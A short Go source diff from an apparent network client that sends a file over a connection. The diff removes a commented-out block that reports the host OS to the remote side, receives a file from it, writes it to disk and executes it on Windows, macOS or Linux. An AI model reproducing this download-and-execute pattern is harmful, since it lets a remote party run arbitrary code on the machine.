@@ -38,44 +38,6 @@ func main() {
 	defer conn.Close()
 
 	SendFile(conn, PATH)
-
-	// bufferFileName := make([]byte, 64)
-	// bufferFileSize := make([]byte, 10)
-
-	// // max byte array length of 9
-	// conn.Write([]byte(fillString(runtime.GOOS, 9)))
-
-	// conn.Read(bufferFileSize)
-	// fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
-
-	// conn.Read(bufferFileName)
-	// fileName := strings.Trim(string(bufferFileName), ":")
-
-	// createPayload, err := os.Create(fileName)
-	// handleError(err)
-
-	// var receivedBytes int64
-
-	// for {
-	// 	if (fileSize - receivedBytes) < BUFFERSIZE {
-	// 		io.CopyN(createPayload, conn, (fileSize - receivedBytes))
-	// 		conn.Read(make([]byte, (receivedBytes+BUFFERSIZE)-fileSize))
-	// 		break
-	// 	}
-	// 	io.CopyN(createPayload, conn, BUFFERSIZE)
-	// 	receivedBytes += BUFFERSIZE
-	// }
-	// logger.Println("Received file completely!")
-	// createPayload.Close()
-	// if runtime.GOOS == "windows" {
-	// 	cmd, err := exec.Command(fileName).Output()
-	// 	handleError(err)
-	// 	fmt.Println(string(cmd))
-	// } else if runtime.GOOS == "darwin" || runtime.GOOS == "linux" {
-	// 	cmd, err := exec.Command("./" + fileName).Output()
-	// 	handleError(err)
-	// 	fmt.Println(string(cmd))
-	// }
 }
 
 func SendFile(conn net.Conn, path string) {
